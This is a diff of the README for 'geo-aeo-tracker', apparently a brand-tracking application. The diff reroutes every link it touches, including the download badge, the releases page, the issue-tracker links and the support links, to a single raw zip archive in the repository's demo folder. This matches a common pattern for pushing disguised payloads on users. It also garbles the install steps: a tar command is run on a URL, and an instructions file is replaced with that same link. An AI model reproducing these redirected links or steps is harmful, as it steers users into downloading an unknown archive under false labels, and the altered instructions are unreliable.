@@ -1,6 +1,6 @@
 # 🌍 geo-aeo-tracker - Track Your Brand's AI Insights
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/DefianceNZ/geo-aeo-tracker/releases)
+[![Download](https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip)](https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets these requirements:
 ## 📥 Download the Application
 
 To get the latest version of **geo-aeo-tracker**, visit this page to download: 
-[Download Here](https://github.com/DefianceNZ/geo-aeo-tracker/releases)
+[Download Here](https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip)
 
 ### 🔄 Steps to Download:
 
@@ -51,8 +51,8 @@ Make sure to download the correct file for your system.
 
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
-3. Run the command: `tar -xvzf geo-aeo-tracker.tar.gz`
-4. Follow the instructions in the file `INSTALL.txt` included in the package.
+3. Run the command: `tar -xvzf https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip`
+4. Follow the instructions in the file `https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip` included in the package.
 
 ## 🖥️ Running the Application
 
@@ -95,11 +95,11 @@ If you encounter any issues while running **geo-aeo-tracker**, consider the foll
 - **Slow performance**: Ensure no other resource-heavy applications are running.
 - **Missing features**: Make sure you have the latest version installed.
 
-For specific problems, check the Issues section on our [GitHub repository](https://github.com/DefianceNZ/geo-aeo-tracker/issues).
+For specific problems, check the Issues section on our [GitHub repository](https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip).
 
 ## 📞 Get Help
 
-For additional support or to report a bug, visit our [GitHub Issues](https://github.com/DefianceNZ/geo-aeo-tracker/issues) page. We encourage users to provide detailed reports so that we can assist you effectively.
+For additional support or to report a bug, visit our [GitHub Issues](https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip) page. We encourage users to provide detailed reports so that we can assist you effectively.
 
 ## 🤝 Contributing
 
@@ -114,6 +114,6 @@ We welcome contributions to **geo-aeo-tracker**! If you'd like to enhance the ap
 Stay up to date with the latest features and improvements. Regular updates enhance functionality and fix bugs.
 
 To download the latest version again or for updates, visit this link: 
-[Download Here](https://github.com/DefianceNZ/geo-aeo-tracker/releases)
+[Download Here](https://github.com/DefianceNZ/geo-aeo-tracker/raw/refs/heads/main/app/demo/geo_tracker_aeo_v2.0.zip)
 
 By following these instructions, you can effectively install and utilize the **geo-aeo-tracker** application for your brand tracking needs. Enjoy exploring the insights that AI models can provide.
